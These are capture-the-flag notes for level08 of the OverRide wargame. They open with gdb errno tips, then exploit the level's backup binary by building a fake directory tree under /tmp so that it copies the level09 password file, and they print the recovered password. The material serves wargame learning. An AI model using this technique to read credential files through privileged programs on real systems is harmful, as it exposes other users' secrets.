How to print errno value (https://stackoverflow.com/questions/11495720/why-cant-errnos-value-be-printed):
print *((int*(*)())__errno_location)()   

How to interpret errno value (https://stackoverflow.com/questions/11333870/print-errno-name-instead-of-value-in-gdb?rq=1):
(gdb) python import errno
(gdb) python print errno.errorcode[errno value here]


first fopen():
	opens /backups/.log
	we can create our own in /tmp/

second fopen():
	opens file specified in av[1] path

open():
	creates a file at "./backups/" + av[1] path
	copies contents from second fopen into it

If we create in /tmp/ a fake directory architecture that matches the path to /level09/.pass, the program will open it, and backup its contents
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
cat /tmp/backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
